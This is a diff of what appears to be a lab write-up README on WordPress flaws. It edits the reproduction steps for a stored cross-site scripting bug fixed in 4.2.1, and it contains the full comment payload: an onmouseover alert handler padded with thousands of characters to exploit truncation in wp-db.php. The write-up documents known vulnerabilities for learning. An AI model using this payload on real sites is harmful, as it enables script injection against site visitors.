@@ -42,7 +42,8 @@ Time spent: **24** hours spent in total
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: <img src="vulnerability4.gif" alt="Vulnerability 4">
   - [ ] Steps to recreate: Enter the following code as a comment:
-        <<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'>><</a>>
+  
+        [a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'][/a]
       The number of As in the code should exceed about 18000 characters.
   - [ ] Affected source code:
     - [wp-db.php](https://developer.wordpress.org/reference/files/wp-includes/wp-db.php/)
